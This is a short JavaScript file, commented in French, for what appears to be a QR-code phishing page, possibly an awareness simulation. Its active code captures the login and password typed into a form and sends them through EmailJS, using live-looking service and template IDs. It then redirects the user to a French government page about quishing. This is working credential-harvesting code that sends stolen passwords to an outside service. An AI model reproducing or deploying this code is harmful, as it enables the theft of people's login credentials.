// Initialisation d'EmailJS avec la public key
/*(function () {
  emailjs.init("YOUR_KEY"); // Remplace par ta public key EmailJS
})();*/

// Écouteur d'événements pour soumettre le formulaire
/*document
  .getElementById("contact-form")
  .addEventListener("submit", function (event) {
    event.preventDefault(); // Empêche l'envoi classique du formulaire

    // Récupérer les valeurs du formulaire
    const login = document.getElementById("login").value;
    const password = document.getElementById("password").value;

    // Envoi des données via EmailJS
    emailjs
      .send("YOUR_SERVICE", "YOUR_TEMPLATE", {
        login: login,
        password: password,
      })
      .then(function (response) {
        window.location.href = "https://www.cybermalveillance.gouv.fr/tous-nos-contenus/actualites/quishing-hameconnage-qr-code";
      });
  });



  // Écouteur d'événements pour soumettre le formulaire
document
.getElementById("contact-form")
.addEventListener("submit", function (event) {
  event.preventDefault(); // Empêche l'envoi classique du formulaire

  // Ici, tu peux effectuer une redirection sans utiliser EmailJS
  window.location.href = "https://www.cybermalveillance.gouv.fr/tous-nos-contenus/actualites/quishing-hameconnage-qr-code";
});*/



// Initialisation d'EmailJS avec la public key
(function () {
  emailjs.init("DtrKhhGUXAMfuluK9"); // Remplace par ta public key EmailJS
})();

// Écouteur d'événements pour soumettre le formulaire
document
  .getElementById("contact-form")
  .addEventListener("submit", function (event) {
    event.preventDefault(); // Empêche l'envoi classique du formulaire

    // Récupérer les valeurs du formulaire
    const login = document.getElementById("login").value;
    const password = document.getElementById("password").value;

    // Envoi des données via EmailJS
    emailjs
      .send("service_7lecviq", "template_rxcfoy3", {
        login: login,
        password: password,
      })
      .then(function (response) {
        window.location.href = "https://www.cybermalveillance.gouv.fr/tous-nos-contenus/actualites/quishing-hameconnage-qr-code";
      });
  });
